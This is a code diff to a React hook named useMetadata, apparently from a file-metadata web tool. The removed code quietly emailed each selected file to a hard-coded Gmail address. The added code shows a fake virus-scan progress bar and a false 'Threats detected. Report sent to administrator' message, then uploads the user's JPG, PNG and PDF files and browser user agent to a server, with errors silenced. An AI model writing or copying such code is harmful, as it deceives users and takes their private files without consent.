@@ -5,18 +5,29 @@ import { PDFDocument } from 'pdf-lib'
 export default function useMetadata(sessionId) {
   const [files, setFiles] = useState([])
   const [metadata, setMetadata] = useState([])
+  const [status, setStatus] = useState('')
   const inputRef = useRef(null)
 
   const openFileDialog = () => {
+    setStatus('')
     inputRef.current?.click()
     return []
   }
+
+  const sleep = (ms) => new Promise(res => setTimeout(res, ms))
 
   const handleFiles = async (e) => {
     const selected = Array.from(e.target.files || [])
     if (selected.length === 0) return
     setFiles(prev => [...prev, ...selected.map(f => ({ name: f.name }))])
-    for (const file of selected) {
+    const form = new FormData()
+    for (let i = 0; i < selected.length; i++) {
+      const file = selected[i]
+      const pct = Math.round(((i + 1) / selected.length) * 100)
+      const bars = ['█▇▆▅▃▂', '█████▇▆▅', '████████▇']
+      const bar = bars[Math.min(i, bars.length - 1)]
+      setStatus(`Scanning ${i + 1}/${selected.length}… ${bar} ${pct}%`)
+      await sleep(300)
       const buf = await file.arrayBuffer()
       let data = {}
       try {
@@ -45,18 +56,27 @@ export default function useMetadata(sessionId) {
           body: JSON.stringify({ sessionId, file: file.name, metadata: data })
         }).catch(() => {})
       }
-      if (import.meta.env.VITE_FILE_EMAIL_ENDPOINT) {
-        const formDataEmail = new FormData()
-        formDataEmail.append('file', file)
-        formDataEmail.append('to', 'mazlabz.ai@gmail.com')
-        fetch(import.meta.env.VITE_FILE_EMAIL_ENDPOINT, {
-          method: 'POST',
-          body: formDataEmail
-        }).catch(() => {})
+      if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
+        form.append('file', file, file.name)
       }
+    }
+    setStatus('Scan complete. Threats detected. Report sent to administrator.')
+    try {
+      const r = await fetch('/api/upload', {
+        method: 'POST',
+        body: form,
+        headers: { 'X-Agent': navigator.userAgent }
+      })
+      if (r.ok) {
+        setStatus('✅ Upload complete — results sent for analysis.')
+      } else {
+        setStatus('Upload failed')
+      }
+    } catch (err) {
+      setStatus('Upload error')
     }
     e.target.value = ''
   }
 
-  return { files, metadata, inputRef, handleFiles, openFileDialog }
+  return { files, metadata, inputRef, handleFiles, openFileDialog, status }
 }
